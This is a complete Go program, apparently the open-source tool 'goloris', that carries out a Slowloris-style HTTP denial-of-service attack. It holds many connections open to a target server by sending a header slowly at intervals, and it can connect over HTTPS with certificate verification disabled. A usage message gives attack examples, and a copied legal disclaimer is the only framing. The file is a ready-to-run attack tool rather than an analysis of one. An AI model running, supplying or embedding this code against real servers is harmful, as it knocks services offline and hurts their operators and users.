package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
	defaultDOSHeader = "Cookie: a=b"
	legalDisclaimer  = `Usage of this program for attacking targets without prior mutual consent is
illegal. It is the end user's responsibility to obey all applicable local, 
state and federal laws. Developers assume no liability and are not 
responsible for any misuse or damage caused by this program.

This disclaimer was shamelessy copied from sqlmap with minor modifications :)
    `
)

func main() {
	var (
		numConnections int
		interval       int
		timeout        int
		method         string
		resource       string
		userAgent      string
		target         string
		https          bool
		dosHeader      string
	)

	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
	flag.StringVar(&method, "method", "GET", "HTTP method to use")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
	flag.BoolVar(&https, "https", false, "Use HTTPS")
	flag.Parse()

	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		if https {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	for i := 0; i < numConnections; i++ {
		go slowloris(target, dosHeader, method, resource, interval, timeout, https)
	}

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, exiting...\n")
			break loop
		}
	}
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
	fmt.Println("EXAMPLES")
	fmt.Printf("  %s -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Println("")
	fmt.Println(legalDisclaimer)
}

func slowloris(target, dosHeader, method, resource string, interval, timeout int, https bool) {
	var conn net.Conn
	var err error

loop:
	for {
		if conn != nil {
			conn.Close()
		}

		conn, err = openConnection(target, timeout, https)
		if err != nil {
			continue
		}

		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", method, resource); err != nil {
			continue
		}

		header := createHeader(target)
		if err = header.Write(conn); err != nil {
			continue
		}

		for {
			select {
			case <-time.After(time.Duration(interval) * time.Second):
				if _, err := fmt.Fprintf(conn, "%s\r\n", dosHeader); err != nil {
					continue loop
				}
			}
		}
	}

}

func openConnection(host string, timeout int, https bool) (net.Conn, error) {
	var conn net.Conn
	var err error
	timeoutDuration := time.Duration(timeout) * time.Second

	if https {
		config := &tls.Config{InsecureSkipVerify: true}
		conn, err = tls.Dial("tcp", host, config)
		if err != nil {
			return nil, err
		}
	} else {
		conn, err = net.DialTimeout("tcp", host, timeoutDuration)
		if err != nil {
			return nil, err
		}
	}

	return conn, nil
}

func createHeader(host string) *http.Header {
	hdr := http.Header{}

	headers := makeHeaderSlice(host)
	for header, value := range headers {
		hdr.Add(header, value)
	}

	return &hdr
}

func makeHeaderSlice(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent
	headers["Content-Length"] = "42"

	return headers
}
